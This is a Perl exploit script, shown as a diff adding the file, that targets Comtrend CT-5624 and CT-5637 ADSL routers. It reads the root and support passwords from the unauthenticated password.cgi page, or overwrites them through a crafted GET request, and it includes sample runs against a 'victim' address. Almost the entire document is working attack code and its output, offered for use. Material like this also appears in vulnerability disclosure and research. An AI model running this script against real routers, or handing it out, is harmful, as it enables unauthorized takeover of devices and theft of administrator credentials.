@@ -1,0 +1,88 @@
+#!/usr/bin/perl
+#
+#  [+] Comtrend Router CT-5624 Remote Root/Support Password Disclosure/Change Exploit
+#
+#  Author: Todor Donev
+#  Email: todor.donev@@gmail
+#  Type: Hardware
+#  Vuln Type: Remote
+# 
+#  Tested:
+#  Board ID    : CT-5624
+#  Software    : A011-306TSR-C01_R03
+#  Bootloader  : 1.0.37-0.7-3
+#  ADSL        : A2pB022c3.d20e
+#
+#  Board ID    : CT-5637
+#  Software    : A111-312BTC-C01_R12
+#  Bootloader  : 1.0.37-12.1-1
+#  ADSL        : A2pB023k.d20k_rc2
+#
+#####
+#  CT-5624 ADSL2+ Ethernet Router
+#  The CT-5624 series ADSL2+ compact and high performance Ethernet router 
+#  provides four 10/100 Ethernet Interfaces, and one ADSL line interface 
+#  to access the Internet, incorporating LAN or Video on Demand over one 
+#  ordinary telephone line, at speeds of up to 24 Mbps. It also has full 
+#  routing capabilities to segment/route IP protocol, and supports advanced 
+#  security functions. 
+#####
+#
+#  playground$ perl comtrend.pl -c 192.168.1.1:80
+#  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
+#  [!] Target: 192.168.1.1:80
+#  [o] New root password: root31337
+#  [o] New support password: sup31337
+#  [*] Successfully !!
+##
+#  playground$ perl comtrend.pl -d 192.168.1.1:80
+#  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
+#  [!] Target: 192.168.1.1:80
+#  [o] root: root31337
+#  [o] support: sup31337
+##
+#  playground$ perl comtrend.pl
+#  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
+#  [!] usg: perl comtrend.pl [-c or -d] <victim>
+#  [!]  -d: Disclosure Root/Support password
+#  [!]  -c: Change Root/Support password
+#
+#####
+#  Thanks to Tsvetelina Emirska 
+#  for the help and support which gives me =)
+#####
+
+use LWP::Simple;
+print "[+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit\n";
+if (@ARGV == 0) {&usg;}
+while (@ARGV > 0) {
+$type = shift(@ARGV);
+$t = shift(@ARGV);
+if ($type eq "-d") {
+my $r = get("http://$t/password.cgi") or die("suck!");
+print "[!] Target: $t\n";
+if ($r =~ m/pwdAdmin = '(.*)';/g) {
+$result .= "[o] root: $1\n";
+}     
+if ($r =~ m/pwdSupport = '(.*)';/g) {
+$result .= "[o] support: $1\n";
+print $result; 
+}}}
+if ($type eq "-c") {
+print "[!] Target: $t\n";
+print "[o] New root password: ";
+my $rootpass=<STDIN>;
+chomp($rootpass);
+print "[o] New support password: ";
+my $suppass=<STDIN>;
+chomp($suppass);
+my $r = get("http://$t/password.cgi?sysPassword=$rootpass&sptPassword=$suppass") or die("suck!");
+if ($r =~ m/pwdAdmin = '$rootpass';/g) {
+print "[*] Successfully !!\n";
+}}
+sub usg(){
+print "[!] usg: perl comtrend.pl [-c or -d] <victim>\n";
+print "[!]  -d: Disclosure Root/Support password\n";
+print "[!]  -c: Change Root/Support password\n";
+exit;
+}
